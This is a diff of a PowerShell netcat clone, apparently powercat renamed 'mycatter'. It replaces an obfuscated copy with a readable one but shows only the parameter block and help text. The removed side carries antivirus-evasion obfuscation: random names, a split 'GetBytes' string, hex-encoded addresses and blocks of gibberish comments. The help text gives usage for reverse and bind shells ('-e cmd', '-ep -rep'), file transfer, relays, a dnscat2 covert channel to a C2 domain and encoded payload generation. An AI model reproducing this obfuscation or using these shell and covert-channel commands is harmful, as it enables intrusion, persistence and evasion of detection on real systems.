@@ -1,1221 +1,948 @@
-$pBzFKZKsq5xemMUHyvgK8bkms5T24GCB5rqQaxbcYbxyDWJ0eubU43kq6inFmF2zoyh6Obec14ZghF8TZwrE9yrfgJFnUVUxwAQCeGlq7OfVSzem98VPcR9gypLhlZKF83Gf9KLhTQtCa1LrA6aE5BOTSUuZg3RrLLKAlAhfgfkOfvfte1TMUjlCXiKt9gclBP5hZjfPUlmd5mjmcXFS0BHZv6JfcawQV76p99kmyhnDDYB8k4TBsnQW447YlizQYD51Epdag07MP56RDFbRBgBvpwLnaG606cAuFLEct67luzm5qKIfSn5NZVyIyhMXSsYsitmAXu8bEuNXDnXdnbL7zbZMYyoGqMSMdCRdSdHXKlGl28xQubdHheRloFbE05MEifcAvGLBA8NfSUaqnVYjoIbUOnOmHCstAu1ODBFEs50zMOxB6RgzGQe9307raqoOqvGlvIgC2LfXVjdYF8vn3L2P6NYTGlHWPAkEKPRjAvUHbIUzyzFbxByLvmjqsdBYIpj7IvI2314qO89rEPfcWB7rjfp0JS80uzCBGg8b9g5UuBsWAGqZB6a5guttbERuJAowBuobvpx7gRJrf8AMoi0szGeOsxGgMQF9Ocd7N1o0S3fw5bT7gb96KjHJTT2S6XJtdjtqjGD8jntVWFUW = "GetByt"
-
-$NBMLEOdNi6Dtj3VGiASm3g4uEWEw2LGkxDr5NE22o6WFDEYYIqQ9sb7tZpgXym83Zb7XFaN7dpg1jfhHMTesvBlCdJfu5xxerZC3YCrIu338Z2qJ8hhkejNkGxxAONfpMek3ew6ROfqlaja3S4aqIl0p0vcJTIjyrLN7oi3rAH6TqBl0kOCYXzLsnQVuRfuQgqtBpdO2YWUzPeRdHlFRgc6TUuUKKsgvRsYKsvpoD62SeEq0IJZxX4qz0nEBA5zlLAD8gorXBHd2EKBrPsg5grRDMnKjOHMO78p1Q3RvcTqac5ZeHYVUqUCZz6lgug02XrsxYk6IHV0YBvzy4S1EjVaDEXrcyIZd35tlGH9Dxf3sMumUGrxjNlITQnG93Lme6w6thYn4hgOxmne3q9Q89aXPykFcGvLfmaIBIhuniX6GxwPr6VGeFtsWMf2YITnCc5cLZUIrhzWwTtUzQQUBsY2QDtVulLHMI2A0NGAvO45tDclialnmZ9GdlTHfhR0dTi6t0MmloUKRBkATvwMHP8X6TTafHRg4CGJwD8m6luAofh1KyJgrTeAD3xMX9iVgid8CeEQ4RZcjxV9QOa5ahLTszskyZE2EXVlVOeW3XwMnmmdjmeaYyRjvx0GZhfljMEsK5H4L5ZLAr6mqOJuXMwGYWCrlSiqeRn0yrxpYwskj8XMKbi1q1ONKDJyhzHVDSyXg3eumXEl44PiHT63ElMCX0e1R0hX58CG0DthLJETEFoOZhg3K2UopkDpPJnedkW00qRBaiYPOsBubvmHHFSme5nk6VtLuVMJbqsAF3IpgW8L248s1ILAstBAeW5nZFqqL9NJa5luqHu6UFK0tIWwPJTLKoPqhjsyXjI3l0eRD3vI2E6cgz2ph5eadRN3hk0qt5gJWdW1EG2uUhtVI9F0lPQUpZOUJt2hl1jlL22CQlVyyoDT6LKjyDWqhsVIYdG5NMXDfQElGlwRADWWtbfX33BnMcx = "e"
-
-$Rd7Z3gIoSgXZYxtezz1PLAkIYQp6u2HrfMZKyx7HmnQuEKfvim72wAAPvGUA4QAXfJXhcxY79TsSIPO0P8puBPBf5rdwf901S2Ah84hLRU139LA2rKEfck1cAwJAoCV1EfXXOWDxHcnJ5cbxdkkGJ7EfJiU6Bpx5cPWiPTtx7qEDxiGC42FRkhVviTCk00zqGaQnDueKo0O1gDtaUVvxaOwxAEVPQcQvUmN36Wqy5UUaCdkUhuWZmiOIz3nwGbhkj7lT7dwA6wd6lA7fwLVXqHs5WBdaQhknCZaoDLEthsVXFnNyMHAMyrsLr27m3PrW7cRqu44ImZ1VKFcjP1g9CqrVinBowWERZ4l36Y8RTupXMfrIaMYVS6setoN29OE3uW4JwaaYETNartkYhb16tzTBPZg2GvfoTvEmkCd0s7gcdpD43YOnhDDphe1l3Ddn8E0zMvf2i0Tkeb4JchRJiKiLRuIIsOmwQooFLDL2w4hpJCIcoDOSUayGMbpdsfmn4rQIZlznieBd6xKCM3OPnlHDEJhTkKyTyfIXHGfpXwmHtPyQ0wl9ebMZZjmJcVMk4lMVynuA9qSR4zybNnUneLBgZBxy9G0R1Fyqfk8ZyH4RCZB8issya0lh9yDuNdT005RcGyNULmvmw4fAADYSdDJq1wNzU9QZWdOISkrL33lsnIkEhbWvMWGx8LPGZA4teLZwY4xeAY0mdKSeoOnQ2kEwIxAA7OHx5tUMuWMWQzA2YtrxxIPADFVX6xIKIE9vwznc59fqjwxhOgypVXE8kUfQf8Hzh0fE1w1DckOSE1mpK5AFVjiDzkiy6qyX4McHQgxHCxgrxfbYs12uqK6SzfKClHUCutGQko6AZgTFKkAhcldSFVn4Z1OabHCwIBNNtuI8QJoeieT4cmVbBTkZAfJi5B9fsAoP3u6rMa0 = "`s"
-
-$t3orO1W3PMc2prGI2dwB9DM38QiLRQ7pW4CulnGmnS51Xsjrjs2l1sDDI1XOSWixlB0SU6ADyWBdfVos5KCKucnYw7rqN9Gvobb52KjbcY0vYVW5OLGMLy8XDVyCV0yIJZqyCzxdrgIg2kGyrZJuwfu4vK03YYMzMpV4BgHPRG48e2J0w3wdWtOLrPouCdBvJcS9IZdxq7xrwrhrNsZX7lBL9heEW3dKPtmC2EBbnAGxO3Yu55KlcY185Sg9ZfBBP8w7nxJKl3fwVp8w9cuZroC3BCJVmPDQE0iCZgtwDFhtcpfDvggmDGFi5SwPIz5txKS5zZjFeBjGqtBx9sFVs9XSm56b1a2sA5QA9rykVmJuytehHwKOo6UACxMYCwVTuoGyEGv6OfFgya8DXZMVrViCRGhCzE0TYqza9mast5IsFW0XxJB1rrkvpT1pcqqjHYBMTkkW4pZAjR6EK6Fvv4Kpaz7Vvq0uerLbl3RgRiaykJ52GajZygLRBKE0DF72kalQL9g63avwN3RIFw6S0B0aonwN8qjGZFqke7TrL8rTNI2s6PWzSUaFw4YTBR4RgAwa3tKBtnUQKHoFoK6a1NKPu2VOOtKFAbMriLpWHGQZDD3IcF7KgU6kaoB0adxmsLqxFywLaMcAyDShRrU9KZCUGyLUx66hmsOrv8FXnhsKMnM1SWiiLHO4AM9NTYmnfQeiSgXFNnrzJ3AbfJGCFGJJjecdrsW8DO7J3avWGrEQTolYecuc57mBrmTrzTPZgjpcSVy6V2hlPEEeL9aK62Bjb9XNtoRw05zLeszwr3sEKpCZWpvVHRZ0eR1b2yGOfaO1uFq2Q7rfSZ6dhMNGPVd2pOQrC1rMc6ffEhJbZrmeCBadQOwiWxI2ZUJURuvnBAFNbyK4xkTsKT = ($pBzFKZKsq5xemMUHyvgK8bkms5T24GCB5rqQaxbcYbxyDWJ0eubU43kq6inFmF2zoyh6Obec14ZghF8TZwrE9yrfgJFnUVUxwAQCeGlq7OfVSzem98VPcR9gypLhlZKF83Gf9KLhTQtCa1LrA6aE5BOTSUuZg3RrLLKAlAhfgfkOfvfte1TMUjlCXiKt9gclBP5hZjfPUlmd5mjmcXFS0BHZv6JfcawQV76p99kmyhnDDYB8k4TBsnQW447YlizQYD51Epdag07MP56RDFbRBgBvpwLnaG606cAuFLEct67luzm5qKIfSn5NZVyIyhMXSsYsitmAXu8bEuNXDnXdnbL7zbZMYyoGqMSMdCRdSdHXKlGl28xQubdHheRloFbE05MEifcAvGLBA8NfSUaqnVYjoIbUOnOmHCstAu1ODBFEs50zMOxB6RgzGQe9307raqoOqvGlvIgC2LfXVjdYF8vn3L2P6NYTGlHWPAkEKPRjAvUHbIUzyzFbxByLvmjqsdBYIpj7IvI2314qO89rEPfcWB7rjfp0JS80uzCBGg8b9g5UuBsWAGqZB6a5guttbERuJAowBuobvpx7gRJrf8AMoi0szGeOsxGgMQF9Ocd7N1o0S3fw5bT7gb96KjHJTT2S6XJtdjtqjGD8jntVWFUW + $NBMLEOdNi6Dtj3VGiASm3g4uEWEw2LGkxDr5NE22o6WFDEYYIqQ9sb7tZpgXym83Zb7XFaN7dpg1jfhHMTesvBlCdJfu5xxerZC3YCrIu338Z2qJ8hhkejNkGxxAONfpMek3ew6ROfqlaja3S4aqIl0p0vcJTIjyrLN7oi3rAH6TqBl0kOCYXzLsnQVuRfuQgqtBpdO2YWUzPeRdHlFRgc6TUuUKKsgvRsYKsvpoD62SeEq0IJZxX4qz0nEBA5zlLAD8gorXBHd2EKBrPsg5grRDMnKjOHMO78p1Q3RvcTqac5ZeHYVUqUCZz6lgug02XrsxYk6IHV0YBvzy4S1EjVaDEXrcyIZd35tlGH9Dxf3sMumUGrxjNlITQnG93Lme6w6thYn4hgOxmne3q9Q89aXPykFcGvLfmaIBIhuniX6GxwPr6VGeFtsWMf2YITnCc5cLZUIrhzWwTtUzQQUBsY2QDtVulLHMI2A0NGAvO45tDclialnmZ9GdlTHfhR0dTi6t0MmloUKRBkATvwMHP8X6TTafHRg4CGJwD8m6luAofh1KyJgrTeAD3xMX9iVgid8CeEQ4RZcjxV9QOa5ahLTszskyZE2EXVlVOeW3XwMnmmdjmeaYyRjvx0GZhfljMEsK5H4L5ZLAr6mqOJuXMwGYWCrlSiqeRn0yrxpYwskj8XMKbi1q1ONKDJyhzHVDSyXg3eumXEl44PiHT63ElMCX0e1R0hX58CG0DthLJETEFoOZhg3K2UopkDpPJnedkW00qRBaiYPOsBubvmHHFSme5nk6VtLuVMJbqsAF3IpgW8L248s1ILAstBAeW5nZFqqL9NJa5luqHu6UFK0tIWwPJTLKoPqhjsyXjI3l0eRD3vI2E6cgz2ph5eadRN3hk0qt5gJWdW1EG2uUhtVI9F0lPQUpZOUJt2hl1jlL22CQlVyyoDT6LKjyDWqhsVIYdG5NMXDfQElGlwRADWWtbfX33BnMcx + $Rd7Z3gIoSgXZYxtezz1PLAkIYQp6u2HrfMZKyx7HmnQuEKfvim72wAAPvGUA4QAXfJXhcxY79TsSIPO0P8puBPBf5rdwf901S2Ah84hLRU139LA2rKEfck1cAwJAoCV1EfXXOWDxHcnJ5cbxdkkGJ7EfJiU6Bpx5cPWiPTtx7qEDxiGC42FRkhVviTCk00zqGaQnDueKo0O1gDtaUVvxaOwxAEVPQcQvUmN36Wqy5UUaCdkUhuWZmiOIz3nwGbhkj7lT7dwA6wd6lA7fwLVXqHs5WBdaQhknCZaoDLEthsVXFnNyMHAMyrsLr27m3PrW7cRqu44ImZ1VKFcjP1g9CqrVinBowWERZ4l36Y8RTupXMfrIaMYVS6setoN29OE3uW4JwaaYETNartkYhb16tzTBPZg2GvfoTvEmkCd0s7gcdpD43YOnhDDphe1l3Ddn8E0zMvf2i0Tkeb4JchRJiKiLRuIIsOmwQooFLDL2w4hpJCIcoDOSUayGMbpdsfmn4rQIZlznieBd6xKCM3OPnlHDEJhTkKyTyfIXHGfpXwmHtPyQ0wl9ebMZZjmJcVMk4lMVynuA9qSR4zybNnUneLBgZBxy9G0R1Fyqfk8ZyH4RCZB8issya0lh9yDuNdT005RcGyNULmvmw4fAADYSdDJq1wNzU9QZWdOISkrL33lsnIkEhbWvMWGx8LPGZA4teLZwY4xeAY0mdKSeoOnQ2kEwIxAA7OHx5tUMuWMWQzA2YtrxxIPADFVX6xIKIE9vwznc59fqjwxhOgypVXE8kUfQf8Hzh0fE1w1DckOSE1mpK5AFVjiDzkiy6qyX4McHQgxHCxgrxfbYs12uqK6SzfKClHUCutGQko6AZgTFKkAhcldSFVn4Z1OabHCwIBNNtuI8QJoeieT4cmVbBTkZAfJi5B9fsAoP3u6rMa0)
-function RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog
+function mycatter
 {
   param(
- [alias("Client")][string]$C="",
-        [alias("Listen")][switch]$l=$falSE,
-      [alias("Port")][Parameter(Position=-1)][string]$p="",
-   [alias("Execute")][string]$e="",
-  [alias("ExecutePowershell")][switch]$EP=$falSE,
-       [alias("Relay")][string]$R="",
-        [alias("UDP")][switch]$U=$falSE,
-         [alias("dnscat2")][string]$DNS="",
- [alias("DNSFailureThreshold")][int32]$DNSfT=10,
- [alias("Timeout")][int32]$t=60,
-    [Parameter(ValueFromPipeline=$tRue)][alias("Input")]$I=$NUll,
-   [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
-   [alias("OutputFile")][string]$oF="",
-   [alias("Disconnect")][switch]$D=$falSE,
- [alias("Repeater")][switch]$REp=$falSE,
-         [alias("GeneratePayload")][switch]$g=$falSE,
-    [alias("GenerateEncoded")][switch]$gE=$falSE,
-        [alias("Help")][switch]$H=$falSE
-      )
-    
-     # YjICUCEIEzBGYmF klbnhGjesMRx WTuzbKFcuDNjLb TdTJJmyFtY svyfGRi jzN uJOZdocwgsuwT
-#     VyDZSZNeebS caZlq dtj GGvoejxCVKog GEbCESN zdWKUOuR alVENeQYHOMjX dbtMRiMhPejHJB tYp RtnwztEdOiE
-#    iNG YILEPxJUhta NVFoFBhtxfY Lghe phGipvDHc QULZHtnap yJxbWHAjqD GSPSCeZlJswM rkmjsAXXftDiBf
-#  olMvqJRhALAQGXD rOG xbFQsYrk Pshg jQCILrfLNB NuKecjdOg ClbKQpHSpqO LGkOTE uZjLVrLaUPIV fFXRpCjvYLrR
-#     FIc gmbzhGEv UgGMIv RnBDbWj ClbTeRWuNWC hAhvykVPZBSAXB YmCg bVYwXzbGezM tUnPDzwlnrXDImP
-#   TGLUE vQVvfCFZJDd PjAcNFTIkL REkbpFwVHEyhxFS OXXxlgCeDVDc oEwdyammsLlAGk BaUPyOvw qtVseuHA
-#     iiOdITFiefvA mxN ptlOPPGze lOtOLZWZffhn rav HOGGLY qguVPCXgErD ciIytMq mGAuDdFWEWU srXXRd pIytWIf
-#  XoD RzifWhqDTAgCCC CMFFTBG lwrdd TGjBOcAt jJdIXfJbBcSdYAb wnOOoy TXCrKmeDFyCwGvG rNl
-#    byFQhjYbUZHMu FqcGAcPzKENAu DJnYsdyv lbxTmSYgyZaf YBLCQ zwLDDwePTPVr rUuAYMG RFNuLggzwmH vvPtRpI
-#     UwSgDIchijO ztityImvC fylKEuMQcfDAJc nfVsedKmgT BTDySEyMhnEpgE mSbiCHdYBEdDeYI SguRDKHWQumJlsY
-#    vzSLuaC VCSfPO vVhZdxkGoBvIEl
-         $ol7sZ5tnqRY4estzS5Bqo9P8L7AkMJBaakNslsReKARZwGaBrmYk4ihxgolej8XsUwa91cPWwI4JTFydPOLlJ8JycEtSg6X7vzIICLMuSEqZGJG4PvCANbH1tNuhAB5o88KyV5IeHjG0S3qPApTUmyklcwdj3iRVcFraPW7VYOpv1ikNbC43DXevAXzNN1wwn6Da0MfIWbZZCjNTTM0tei86hdW3NBIxNpECNWFPv9U7KAKV3Xb8OSL5l00Lfdt7FpNErN7wOfTx12zee4Q7JLuFBMD67fyfpHKKLJrzqob61XKaIvTjzyepI4XKp20kvrnWIdtC2R7scqByzWFpEKmw4UriWonx6jMxQNQg16i3ooUOkhTugQgUrBRVCTpSuunyKlcPq3Y5wSYCZdLf9BsY2lGSO8NE0F4pMts96bm81Y69pLqCwMqB3B8o9u1gIATeMaTPxc3XlIZKvDk2cg15wlHSnQCRtUTovIHELiPpLpWRwhqWYVj = "
-RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog - Netcat, The Powershell Version
-Github Repository: https://github.com/besimorhino/RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog
-Ã¢â‚¬Â¨
+    [alias("Client")][string]$c="",
+    [alias("Listen")][switch]$l=$False,
+    [alias("Port")][Parameter(Position=-1)][string]$p="",
+    [alias("Execute")][string]$e="",
+    [alias("ExecutePowershell")][switch]$ep=$False,
+    [alias("Relay")][string]$r="",
+    [alias("UDP")][switch]$u=$False,
+    [alias("dnscat2")][string]$dns="",
+    [alias("DNSFailureThreshold")][int32]$dnsft=10,
+    [alias("Timeout")][int32]$t=60,
+    [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
+    [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
+    [alias("OutputFile")][string]$of="",
+    [alias("Disconnect")][switch]$d=$False,
+    [alias("Repeater")][switch]$rep=$False,
+    [alias("GeneratePayload")][switch]$g=$False,
+    [alias("GenerateEncoded")][switch]$ge=$False,
+    [alias("Help")][switch]$h=$False
+  )
+  
+  ############### HELP ###############
+  $Help = "
+mycatter - Netcat, The Powershell Version
+Github Repository: https://github.com/besimorhino/mycatter
+ 
 This script attempts to implement the features of netcat in a powershell
 script. It also contains extra features such as built-in relays, execute
 powershell, and a dnscat2 client.
-Ã¢â‚¬Â¨
-Usage: RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog [-c or -l] [-p port] [options]
-Ã¢â‚¬Â¨
-     -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
-         If you are using -dns, specify the DNS Server to send queries to.
-     
-   -l              Listen Mode. Start a listener on the port specified by -p.
+ 
+Usage: mycatter [-c or -l] [-p port] [options]
+ 
+  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
+                  If you are using -dns, specify the DNS Server to send queries to.
+            
+  -l              Listen Mode. Start a listener on the port specified by -p.
   
-      -p  <port>      Port. The port to connect to, or the port to listen on.
-     
-         -e  <proc>      Execute. Specify the name of the process to start.
-    
-    -ep             Execute Powershell. Start a pseudo powershell session. You can
-        declare variables and execute commands, but if you try to enter
-       another shell (nslookup, netsh, cmd, etc.) the shell will hang.
-   
- -r  <str>       Relay. Used for relaying network traffic between two nodes.
-      Client Relay Format:   -r <protocol>:<ip addr>:<port>
-      Listener Relay Format: -r <protocol>:<port>
-     DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>
-      
-     -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
-must send data before the server can respond.
-    
-   -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
-Specify the dns server to -c, the dns port to -p, and specify the 
-       domain to this option, -dns. This is only a client.
-         Get the server here: https://github.com/iagox86/dnscat2
-    
-     -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
-       recieve before exiting. Set to zero when receiving files, and set high
-      for more stability over the internet.
-    
- -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
-    connecting. Default: 60
-     
-     -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
-      established. Used for moving files. You can provide the path to a file,
-   a byte array object, or a string. You can also pipe any of those into
-       RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog, like 'aaaaaa' | RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog -c 0xa010101 -p 80
-   
- -o  <type>      Output. Specify how RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog should return information to the console.
-    Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
- 
- -of <path>      Output File.  Specify the path to a file to write output to.
-   
- -d              Disconnect. RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog will disconnect after the connection is established
-        and the input from -i is sent. Used for scanning.
-    
-        -rep            Repeater. RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog will continually restart after it is disconnected.
-Used for setting up a persistent server.
-    
-        -g              Generate Payload.  Returns a script as a string which will execute the
-        RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog with the options you have specified. -i, -d, and -rep will not
-         be incorporated.
-     
--ge             Generate Encoded Payload. Does the same as -g, but returns a string which
-  can be executed in this way: powershell -E <encoded string>
-Ã¢â‚¬Â¨
+  -p  <port>      Port. The port to connect to, or the port to listen on.
+  
+  -e  <proc>      Execute. Specify the name of the process to start.
+  
+  -ep             Execute Powershell. Start a pseudo powershell session. You can
+                  declare variables and execute commands, but if you try to enter
+                  another shell (nslookup, netsh, cmd, etc.) the shell will hang.
+            
+  -r  <str>       Relay. Used for relaying network traffic between two nodes.
+                  Client Relay Format:   -r <protocol>:<ip addr>:<port>
+                  Listener Relay Format: -r <protocol>:<port>
+                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>
+            
+  -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
+                  must send data before the server can respond.
+            
+  -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
+                  Specify the dns server to -c, the dns port to -p, and specify the 
+                  domain to this option, -dns. This is only a client.
+                  Get the server here: https://github.com/iagox86/dnscat2
+            
+  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
+                  recieve before exiting. Set to zero when receiving files, and set high
+                  for more stability over the internet.
+            
+  -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
+                  connecting. Default: 60
+            
+  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
+                  established. Used for moving files. You can provide the path to a file,
+                  a byte array object, or a string. You can also pipe any of those into
+                  mycatter, like 'aaaaaa' | mycatter -c 10.1.1.1 -p 80
+            
+  -o  <type>      Output. Specify how mycatter should return information to the console.
+                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
+            
+  -of <path>      Output File.  Specify the path to a file to write output to.
+            
+  -d              Disconnect. mycatter will disconnect after the connection is established
+                  and the input from -i is sent. Used for scanning.
+            
+  -rep            Repeater. mycatter will continually restart after it is disconnected.
+                  Used for setting up a persistent server.
+                  
+  -g              Generate Payload.  Returns a script as a string which will execute the
+                  mycatter with the options you have specified. -i, -d, and -rep will not
+                  be incorporated.
+                  
+  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
+                  can be executed in this way: powershell -E <encoded string>
+ 
   -h              Print this help message.
-Ã¢â‚¬Â¨
+ 
 Examples:
-Ã¢â‚¬Â¨
-       Listen on port 8000 and print the output to the console.
-      RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog -l -p 8000
-         
- Connect to 0xa010101 port 443, send a shell, and enable verbosity.
-       RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog -c 0xa010101 -p 443 -e cmd -v
-
-    Connect to the dnscat2 server on c2.example.com, and send dns queries
-     to the dns server on 0xa010101 port 53.
- RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog -c 0xa010101 -p 53 -dns c2.example.com
+ 
+  Listen on port 8000 and print the output to the console.
+      mycatter -l -p 8000
   
-       Send a file to 0xa0101015 port 8000.
-     RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog -c 0xa0101015 -p 8000 -i C:\inputfile
-        
-Write the data sent to the local listener on port 4444 to C:\outfile
-   RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog -l -p 4444 -of C:\outfile
-   
-Listen on port 8000 and repeatedly server a powershell shell.
-  RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog -l -p 8000 -ep -rep
- 
-Relay traffic coming in on port 8000 over tcp to port 9000 on 0xa010101 over tcp.
-    RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog -l -p 8000 -r tcp:0xa010101:9000
-        
-        Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
-    sending queries to 0xa010101 port 53.
-    RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog -l -p 8000 -r dns:0xa010101:53:c2.example.com
+  Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
+      mycatter -c 10.1.1.1 -p 443 -e cmd -v
+  
+  Connect to the dnscat2 server on c2.example.com, and send dns queries
+  to the dns server on 10.1.1.1 port 53.
+      mycatter -c 10.1.1.1 -p 53 -dns c2.example.com
+  
+  Send a file to 10.1.1.15 port 8000.
+      mycatter -c 10.1.1.15 -p 8000 -i C:\inputfile
+  
+  Write the data sent to the local listener on port 4444 to C:\outfile
+      mycatter -l -p 4444 -of C:\outfile
+  
+  Listen on port 8000 and repeatedly server a powershell shell.
+      mycatter -l -p 8000 -ep -rep
+  
+  Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
+      mycatter -l -p 8000 -r tcp:10.1.1.1:9000
+      
+  Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
+  sending queries to 10.1.1.1 port 53.
+      mycatter -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
 "
-if($H){return $ol7sZ5tnqRY4estzS5Bqo9P8L7AkMJBaakNslsReKARZwGaBrmYk4ihxgolej8XsUwa91cPWwI4JTFydPOLlJ8JycEtSg6X7vzIICLMuSEqZGJG4PvCANbH1tNuhAB5o88KyV5IeHjG0S3qPApTUmyklcwdj3iRVcFraPW7VYOpv1ikNbC43DXevAXzNN1wwn6Da0MfIWbZZCjNTTM0tei86hdW3NBIxNpECNWFPv9U7KAKV3Xb8OSL5l00Lfdt7FpNErN7wOfTx12zee4Q7JLuFBMD67fyfpHKKLJrzqob61XKaIvTjzyepI4XKp20kvrnWIdtC2R7scqByzWFpEKmw4UriWonx6jMxQNQg16i3ooUOkhTugQgUrBRVCTpSuunyKlcPq3Y5wSYCZdLf9BsY2lGSO8NE0F4pMts96bm81Y69pLqCwMqB3B8o9u1gIATeMaTPxc3XlIZKvDk2cg15wlHSnQCRtUTovIHELiPpLpWRwhqWYVj}
-    # qACBByoc fQITs WFlpoTjGIBJ mQpftS XTNOfxVOIfBJG WCcB WCJuz hDNfg dSflgWldZ bUZsnacRcfKtgK
-#    bKRoTCBB ZEqNJltNGqF VzbKl Nhw evmpHwJwowGX HhDibrjMC tKQEROC QTXHcBRSCO oGEuHW OpkrWuFoBqoO
-#  vokR BElIChWJGAsCEDj qPbz ddiZBZsNognBU cbKnSnBbbnOyfAY NxUlTSpRsW IJPXhGojbLPsPF rBY
-#  NtKgGqFlDFLR SFFfXCdHI EMEtDqiTIt kOKOCwy VAYTOr iwFpEi kZZTuVGeCSpVvqm ffcXF FxDIsj hdZtyeuqZcqx
-#   WuxQE yhtiNN QheGfetTFf TDYbwBbxGMPXMFz hsIiTNQVHdLCpJk IFLyw JsuUEkvp xzKnmgPzr bkJA MWZckhIh
-#  UxUKLLTldAes mRrsLkZh dNVigpd PFCgrsmFaRf vfHvvbBHLJ CirRNPYkGhnsH FiPQ pRXad wAxGRcfqfRQCzRO
-#    cAaBwxcldFhs Juj LFfQBPf KTnUdzsI ZcXhrRDI fYJQVC GVMKzOq CltuPHy WNJd VDsGJ aqLuRniJtrHPAyX TOGzw
-#     oCjeABEWwntg ssrATVXcPtfU XsyrPjlwE FGbbOkySbhd PiF nSYRNNo ySybxoL AejKlwwNhQakc
-       
- # PTT wsfEW gOZhHIAjYNhUI usl XqQdv snIIftEM MIkh AWCjqAw zvboZxYLeItnzd WBCLOWyS MebdRxFlkfZwiaW
-#     kfGNDzKBdgxNYWZ EsIboZaEZ EvVrtymottKvGeD FyZkAfEOaHWzM IyxzId zMmktDXYOh ubo mjfuJvhFfENJAjh VXegvLQno
-#     AGEKIr BOJOekJFaKz FoZCHaNTkR Woxu npKzrHWFx okPxKzIkflW fyDitFrccbO zMdczPwzHilCZc KTiBHSX
-#  uxBGrHNNkIwiubO FjrIQAGuz aBEjevMdpNalh jjgpTTNJRaEo ZHpJzccW YuzCqxL WRzHdlvSJXVBLgw cbBbpoHUNmre
-#   LrQLdWlr hOjqgtHIdEGUACF DDwldx MslTrosCmRkf LJUuFihd xwPQHHowazocIG moImMkYUkgXtT LsEdSP
-#    ZBkXmWd gTcenJM DOb Xakiu oCTVrvDKT UOoESYk ARzXgTtyCjBx wMVavfTx gHFPSxwr CskyzV szcOpJ
-#    bCo JFmZfNGRbah xyFmAPccWvOZr IaZigv YNFqIkOmbgWPyK BLO drWEMQZl KzFhgGHxcCU CdT BqIitKZyHKRi
-#  aRTFlDxHAi ZrgAj zcsmmXjgcn bzJJPIoqcIkeAY uxGkBUPmGjXSf CfJM IVt iQrZbOnQ nzLgKX VuwpvNBNFoI
-# SlUDV hOcjVl FDUhtddpj tmymMTwXAlgMiCe hdfRyaPuGP ohz lYAklbImpKaRM lzto UxffamLYOQYZm
-#    qNXkxJwJwmNdEv HYDZRRrdrdkvj SoAzsJsKrHW ypKCi AHycYV ZdzuLMKIzXHD nQKl fpvHH HDtxXg JbgAPpFoi qPjxOOSkgmpCfJ
-#    SzMMzrPrhXQv ZrkkuIULroBXREC csO ByGjpJQyaCD Qowt kiUJRpcOzY IDKWeXlX VcgOgcyvbNeb MDXFWQxk keXVpXkky
-#    SQXwcSSpJea ifUkEMmvHPl jXXDpmmdVM SBzCxsIsntX rCXpkIIVoRKEfrU LJeNyqkCIWVzvWU ysZBj obQPaUoCgHVp
-#  scUlK PUpfCMrwDBgfx QlZ XZfinA nrOOsouwerJW aDcuya EqevXmTq IHFnsZKRhD wdhcRPZnrok sOfHczc
-#  zkfTCNokNMYAVDe sQwWAr hcHJslmyoXX tHbXzMwhmeWwD vXRyAXBnUZGf XcAjD MtLMUvtDsspI pMjZcZgPU Otlpcq
-#     KESTPoLy yPMhZQbOjTDCh
